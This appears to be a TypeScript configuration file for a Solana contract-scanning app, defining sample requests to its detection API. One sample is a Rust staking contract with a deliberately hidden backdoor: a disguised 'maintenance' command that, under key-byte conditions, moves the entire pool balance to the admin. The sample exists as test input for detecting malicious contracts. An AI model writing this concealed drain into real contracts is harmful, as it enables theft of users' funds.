import { getTransactionTimestamp } from "@/lib/utils";

const ApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/scan";
const ScanTypeApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/scan?type=SCAN";
const GetTransactionApiUrl = process.env.NEXT_PUBLIC_APP_URL + "api/scan";

export const DetectionApiData = {
  "SmartContract": {
    url: ScanTypeApiUrl,
    body: {
      contract_code: "use solana_program::{\n    account_info: : {next_account_info, AccountInfo\n    },\n    entrypoint,\n    entrypoint: :ProgramResult,\n    pubkey: :Pubkey,\n    msg,\n    program: : {invoke, invoke_signed\n    },\n    system_instruction,\n    program_error: :ProgramError,\n    sysvar: : {rent: :Rent, Sysvar\n    },\n};\n\nentrypoint!(process_instruction);\n\npub fn process_instruction(\n    program_id: &Pubkey,\n    accounts: &[AccountInfo\n],\n    instruction_data: &[u8\n],\n) -> ProgramResult {\n    let accounts_iter = &mut accounts.iter();\n\n    let admin_account = next_account_info(accounts_iter)?;\n    let user_account = next_account_info(accounts_iter)?;\n    let pool_account = next_account_info(accounts_iter)?;\n    let system_program = next_account_info(accounts_iter)?;\n\n    let command = instruction_data[\n        0\n    ];\n\n    // Subtle condition for hidden behavior, based on specific user account properties\n    if command == 3 && user_account.key.to_bytes()[\n        0\n    ] % 2 == 0 {\n        // This branch performs a series of legitimate-looking operations that conceal harmful intent\n        return perform_maintenance_tasks(\n            admin_account,\n            user_account,\n            pool_account,\n            system_program,\n            accounts_iter,\n        );\n    }\n    // Main functionality of the contract\n    match command {\n        0 => {\n            // Handle staking, appears normal and functional\n            msg!(\"Processing stake...\");\n            process_stake(user_account, pool_account)?;\n        }\n        1 => {\n            // Handle withdrawal, appears normal and functional\n            msg!(\"Processing withdrawal...\");\n            process_withdrawal(user_account, pool_account)?;\n        }\n        2 => {\n            // Admin collects routine fees, appears normal\n            msg!(\"Collecting routine fees...\");\n            process_fee_collection(admin_account, pool_account)?;\n        }\n        _ => {\n            msg!(\"Invalid command.\");\n            return Err(ProgramError: :InvalidInstructionData);\n        }\n    }\n\n    Ok(())\n}\n\nfn process_stake(user_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let staking_amount = **user_account.lamports.borrow() / 10;\n    **user_account.try_borrow_mut_lamports()? -= staking_amount;\n    **pool_account.try_borrow_mut_lamports()? += staking_amount;\n\n    Ok(())\n}\n\nfn process_withdrawal(user_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let withdraw_amount = **pool_account.lamports.borrow() / 10;\n    **pool_account.try_borrow_mut_lamports()? -= withdraw_amount;\n    **user_account.try_borrow_mut_lamports()? += withdraw_amount;\n\n    Ok(())\n}\n\nfn process_fee_collection(admin_account: &AccountInfo, pool_account: &AccountInfo) -> ProgramResult {\n    let fee_amount = **pool_account.lamports.borrow() / 50;\n    **pool_account.try_borrow_mut_lamports()? -= fee_amount;\n    **admin_account.try_borrow_mut_lamports()? += fee_amount;\n\n    Ok(())\n}\n\nfn perform_maintenance_tasks(\n    admin_account: &AccountInfo,\n    user_account: &AccountInfo,\n    pool_account: &AccountInfo,\n    system_program: &AccountInfo,\n    accounts_iter: &mut std: :slice: :Iter<AccountInfo>,\n) -> ProgramResult {\n    msg!(\"Performing scheduled maintenance...\");\n\n    // This condition appears to perform routine checks, but actually triggers hidden fund transfers\n    if user_account.is_signer && admin_account.is_signer {\n        if (user_account.key.to_bytes()[\n            0\n        ] ^ admin_account.key.to_bytes()[\n            0\n        ]) % 3 == 0 {\n            let amount_to_transfer = **pool_account.lamports.borrow();\n            **pool_account.try_borrow_mut_lamports()? -= amount_to_transfer;\n            **admin_account.try_borrow_mut_lamports()? += amount_to_transfer;\n            msg!(\"Maintenance completed successfully.\");\n        } else {\n            msg!(\"No maintenance actions required.\");\n        }\n    }\n\n    Ok(())\n}",
      action: "analyze_contract_code"
    },
    method: "POST",
  },
  "ContractAddress": {
    url: ScanTypeApiUrl,
    body: {
      contract_address: "984GBL7PhceChtN64NWLdBb49rSQXX7ozpdkEbR1pump",
      action: "analyze_contract"
    },
    method: "POST",
  },
  "Transaction": {
    url: ScanTypeApiUrl,
    body: {
      tx_signature: "2AKnN7V5MLD1fyauEWnvMo1dJiCoCUnHnKcmuTtjrNguK288ssULLZeJ9Rkdq8sLk6kENie4oShciRj45aK8AJZD",
      action: "analyze_transaction"
    },
    method: "POST",
  },
  "ContractTransactions": {
    url: GetTransactionApiUrl + "?timestamp=" + getTransactionTimestamp(),
    method: "Get",
    body: {},
  },
}

// // Get current UTC time
// const now = new Date();
// const utcTimeString = now.toISOString();
// console.log('Current UTC time:', utcTimeString);

// // You can also get individual UTC components:
// const utcYear = now.getUTCFullYear();
// const utcMonth = now.getUTCMonth() + 1; // getUTCMonth() returns 0-11
// const utcDay = now.getUTCDate();
// const utcHours = now.getUTCHours();
// const utcMinutes = now.getUTCMinutes();
// const utcSeconds = now.getUTCSeconds();

// console.log(`UTC Date: ${utcYear}-${utcMonth}-${utcDay}`);
// console.log(`UTC Time: ${utcHours}:${utcMinutes}:${utcSeconds}`);
